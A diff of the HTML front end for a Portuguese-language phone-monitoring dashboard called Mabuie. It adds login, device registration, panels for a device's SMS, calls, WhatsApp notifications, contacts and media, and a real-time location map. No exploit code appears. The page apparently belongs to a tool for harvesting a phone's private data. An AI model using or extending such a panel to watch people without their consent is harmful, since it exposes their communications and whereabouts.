@@ -1,93 +1,123 @@
-
 <!doctype html>
-<html>
+<html lang="pt">
 <head>
-  <meta charset="utf-8">
-  <title>Mabuie Painel</title>
-  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
-  <style>
-    body { font-family: "Segoe UI", Roboto, Arial; margin: 0; padding: 0; background:#f7f9fb; color:#222; }
-    header { display:flex; justify-content:space-between; align-items:center; padding:12px 16px; background:#fff; box-shadow:0 2px 6px rgba(0,0,0,0.06); }
-    header h1 { margin:0; font-size:18px; }
-    .toolbar { display:flex; gap:8px; align-items:center; }
-    .icon-btn { background:#eef2f7; border-radius:8px; padding:8px 12px; cursor:pointer; display:flex; align-items:center; gap:8px; }
-    #main { padding:16px; max-width:1200px; margin:12px auto; }
-    #map { height:420px; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.08); display:none; }
-    section.card { background:#fff; padding:12px; border-radius:8px; margin-bottom:12px; box-shadow:0 1px 4px rgba(0,0,0,0.05); }
-    ul { list-style:none; padding-left:0; margin:0; }
-    li { padding:6px 0; border-bottom:1px dashed #eee; }
-    .hidden { display:none; }
-    #loginBox input { padding:8px; margin:6px 0; width:280px; }
-    button { padding:8px 10px; border-radius:6px; background:#1976d2; color:#fff; border:none; cursor:pointer; }
-    .small { padding:6px 8px; font-size:13px; }
-  </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Mabuie — Painel de Monitoramento</title>
+
+  <!-- Leaflet -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+
+  <!-- Styles -->
+  <link rel="stylesheet" href="styles.css" />
+
+  <!-- Icons (simple) -->
 </head>
 <body>
-  <header>
-    <h1>Mabuie — Painel</h1>
-    <div class="toolbar">
-      <div id="userInfo"></div>
-      <div id="btnLogout" class="icon-btn hidden">🔓 Sair</div>
+  <header class="topbar">
+    <div class="brand">Mabuie <span class="muted">Painel</span></div>
+
+    <div class="right">
+      <div id="userLabel" class="userLabel hidden"></div>
+      <button id="btnLogout" class="btn small hidden">Sair</button>
     </div>
   </header>
 
-  <div id="main">
-    <div id="loginBox" class="card">
-      <h2>Entrar</h2>
-      <input id="username" placeholder="Usuário" /><br/>
-      <input id="password" placeholder="Senha" type="password" /><br/>
-      <button id="btnLogin">Entrar</button>
-      <button id="btnRegister" style="background:#4caf50">Registar</button>
-      <p id="loginMsg"></p>
-    </div>
-
-    <div id="dashboard" class="hidden">
-      <div style="display:flex; gap:12px; margin-bottom:12px; flex-wrap:wrap;">
-        <div class="icon-btn" id="iconDevices">📱 Dispositivos</div>
-        <div class="icon-btn" id="iconMessages">✉️ Mensagens</div>
-        <div class="icon-btn" id="iconNotifs">🔔 Notificações</div>
-        <div class="icon-btn" id="iconContacts">📇 Contactos</div>
-        <div class="icon-btn" id="iconMedia">📁 Media</div>
-        <div class="icon-btn" id="iconMap">🗺️ Mapa</div>
+  <main class="container">
+    <aside class="sidebar">
+      <div id="loginBox" class="card loginCard">
+        <h2>Entrar / Registar</h2>
+        <input id="username" placeholder="Usuário" autocomplete="username" />
+        <input id="password" type="password" placeholder="Senha" autocomplete="current-password" />
+        <div class="row">
+          <button id="btnLogin" class="btn">Entrar</button>
+          <button id="btnRegister" class="btn alt">Registar</button>
+        </div>
+        <p id="loginMsg" class="msg"></p>
       </div>
 
-      <div id="map" class="card"></div>
+      <div id="dashboardPanel" class="hidden">
+        <div class="card">
+          <h3>Controle</h3>
+          <div class="menu">
+            <button class="menuBtn" data-show="devicesSection">📱 Dispositivos</button>
+            <button class="menuBtn" data-show="messagesSection">✉️ Mensagens</button>
+            <button class="menuBtn" data-show="callsSection">📞 Chamadas</button>
+            <button class="menuBtn" data-show="notifsSection">🔔 Notificações</button>
+            <button class="menuBtn" data-show="contactsSection">📇 Contactos</button>
+            <button class="menuBtn" data-show="mediaSection">📁 Media</button>
+            <button class="menuBtn" data-show="mapSection">🗺️ Mapa</button>
+          </div>
+        </div>
 
-      <section id="devicesSection" class="card">
+        <div class="card">
+          <h4>Registrar dispositivo</h4>
+          <input id="deviceIdInput" placeholder="Device ID (do app)" />
+          <input id="deviceLabelInput" placeholder="Etiqueta (ex: SM-A035F)" />
+          <button id="btnRegisterDevice" class="btn small">Registar Device</button>
+          <p id="deviceMsg" class="msg"></p>
+        </div>
+      </div>
+    </aside>
+
+    <section class="content">
+      <!-- Devices -->
+      <section id="devicesSection" class="card panel">
         <h3>Dispositivos</h3>
         <div id="devicesList">Carregando...</div>
       </section>
 
-      <section id="messagesSection" class="card hidden">
-        <h3>Mensagens</h3>
-        <ul id="smsList"></ul>
+      <!-- Messages -->
+      <section id="messagesSection" class="card panel hidden">
+        <h3>Mensagens (SMS)</h3>
+        <ul id="smsList" class="list"></ul>
       </section>
 
-      <section id="notifsSection" class="card hidden">
-        <h3>Notificações</h3>
-        <ul id="notifList"></ul>
-      </section>
-
-      <section id="contactsSection" class="card hidden">
-        <h3>Contactos</h3>
-        <ul id="contactsList"></ul>
-      </section>
-
-      <section id="mediaSection" class="card hidden">
-        <h3>Media</h3>
-        <ul id="mediaList"></ul>
-      </section>
-
-      <section id="callsSection" class="card hidden">
+      <!-- Calls -->
+      <section id="callsSection" class="card panel hidden">
         <h3>Chamadas</h3>
-        <ul id="callsList"></ul>
+        <ul id="callsList" class="list"></ul>
       </section>
 
-    </div>
-  </div>
+      <!-- Notifications -->
+      <section id="notifsSection" class="card panel hidden">
+        <h3>Notificações (WhatsApp etc.)</h3>
+        <ul id="notifList" class="list"></ul>
+      </section>
 
+      <!-- Contacts -->
+      <section id="contactsSection" class="card panel hidden">
+        <h3>Contactos</h3>
+        <ul id="contactsList" class="list"></ul>
+      </section>
+
+      <!-- Media -->
+      <section id="mediaSection" class="card panel hidden">
+        <h3>Media</h3>
+        <div id="mediaList">Carregando...</div>
+        <div id="mediaViewer" class="mediaViewer hidden">
+          <div id="mediaPreview"></div>
+          <div class="row">
+            <button id="mediaDownloadBtn" class="btn small">Download</button>
+            <button id="mediaCloseBtn" class="btn alt small">Fechar</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- Map -->
+      <section id="mapSection" class="card panel hidden">
+        <h3>Mapa — Histórico / Localização em tempo real</h3>
+        <div id="map" style="height:480px;"></div>
+      </section>
+
+    </section>
+  </main>
+
+  <!-- Socket.io -->
   <script src="/socket.io/socket.io.js"></script>
+  <!-- Leaflet -->
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <!-- App script -->
   <script src="scripts/main.js"></script>
 </body>
-</html>
+          </html>
